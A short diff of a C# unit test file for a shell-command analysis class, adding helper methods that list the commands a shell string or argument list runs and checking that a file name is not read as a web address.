         Assert.Equal([], CommandAnalysis.WebAddresses(["curl.tar.gz"]));
     }
+
+    /// <summary>The commands a shell string runs, each whole: its words, then its redirects as they are spelled.</summary>
+    private static IReadOnlyList<IReadOnlyList<string>> Commands(string shell)
+        => [.. CommandAnalysis.Commands(shell).Select(command => command.Whole)];
+
+    /// <summary>The commands an argument list runs, each whole.</summary>
+    private static IReadOnlyList<IReadOnlyList<string>> Commands(IReadOnlyList<string> argv)
+        => [.. CommandAnalysis.Commands(argv).Select(command => command.Whole)];
 }
